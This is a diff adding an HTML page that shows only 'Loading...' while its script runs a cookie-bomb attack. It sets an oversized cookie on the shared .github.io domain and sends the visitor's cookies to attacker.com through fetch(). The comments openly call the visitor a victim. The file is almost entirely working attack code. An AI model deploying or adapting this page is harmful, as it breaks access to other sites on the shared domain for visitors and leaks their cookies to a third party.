@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <script>
+        // Create a massive cookie value (1111 "a" characters)
+        let cookieValue = "a".repeat(1111);
+
+        // Set the cookie to "bomber1111"
+        document.cookie = "bomber1111=" + cookieValue + "; path=/; domain=.github.io; Secure;";
+
+        // Notify the attacker that a new victim is affected
+        fetch("https://attacker.com/log?victim=" + document.cookie);
+    </script>
+</head>
+<body>
+    <h1>Loading...</h1>
+</body>
+</html>
